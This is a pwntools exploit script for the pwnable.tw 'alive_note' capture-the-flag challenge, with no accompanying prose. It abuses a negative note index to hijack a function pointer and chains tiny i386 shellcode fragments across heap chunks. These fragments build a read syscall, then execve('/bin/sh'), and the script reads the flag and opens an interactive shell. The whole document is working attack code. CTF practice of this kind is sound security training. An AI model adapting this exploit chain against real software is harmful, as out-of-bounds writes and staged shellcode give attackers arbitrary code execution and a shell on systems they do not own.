#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 10300
HOST = "chall.pwnable.tw"
exe = context.binary = ELF('./alive_note', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py

            # add
            b* 0x08048828

            # show
            b* 0x08048962

            # free
            b* 0x080488EA
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, data):
    p.sendafter(b'choice :', str(1))
    p.sendafter(b'Index :', str(idx))
    p.sendafter(b'Name :', data)

def show(idx):
    p.sendafter(b'choice :', str(2))
    p.sendafter(b'Index :', str(idx))

def free(idx):
    p.sendafter(b'choice :', str(3))
    p.sendafter(b'Index :', str(idx))

# VARIABLE


# PAYLOAD
# read(0, addr, 0x70)
shellcode1 = asm('''
    push eax
    pop ecx
    push edx
    pop edx
    push 0x69
    ''', arch='i386')
shellcode1 += b'\x75\x38' # jump shellcode2
add(-27, shellcode1)

add(0, b'a'*8)
add(1, b'a'*8)
add(2, b'a'*8)
shellcode2 = asm('''
    pop eax
    xor byte ptr [ecx + 0x30], al
    push edx
    pop eax
    ''', arch='i386')
shellcode2 += b'\x75\x38' # jump shellcode3
add(3, shellcode2)

shellcode3 = asm('''
    dec eax
    xor byte ptr [ecx + 0x31], al
    xor al, 0x4d
    ''', arch='i386')
shellcode3 += b'\x75\x38' # jump shellcode4
add(4, b'a'*8)
add(5, b'a'*8)
add(6, b'a'*8)
add(7, shellcode3)

add(1, b'a'*8)
add(1, b'a'*8)
add(1, b'a'*8)
shellcode4 = asm('''
    xor byte ptr [ecx + 0x32], al
    push edx
    inc edx
    inc edx
    ''', arch='i386')
shellcode4 += b'\x75\x38' # jump shellcode5
add(1, shellcode4)

add(1, b'a'*8)
add(1, b'a'*8)
add(1, b'a'*8)
shellcode5 = asm('''
    inc edx
    push edx
    pop eax
    push 0x70
    pop edx
    ''', arch='i386')
add(1, shellcode5 + b'\x75\x38') # jump to syscall read

add(2, b'a'*8)
add(1, b'a'*8)
add(1, b'a'*8)
add(1, b'2'*8)

# GDB()
free(2)

shellcode = asm('''
    mov eax, 0xb
    mov ebx, ecx
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''')
payload = b'/bin/sh'.ljust(0x33, b'\0') + shellcode
p.send(payload)

input("Press ENTER to get flag")
p.sendline(b'cat /home/alive_note/flag')

p.interactive()
# call (int)mprotect(heap_base,0x22000,7)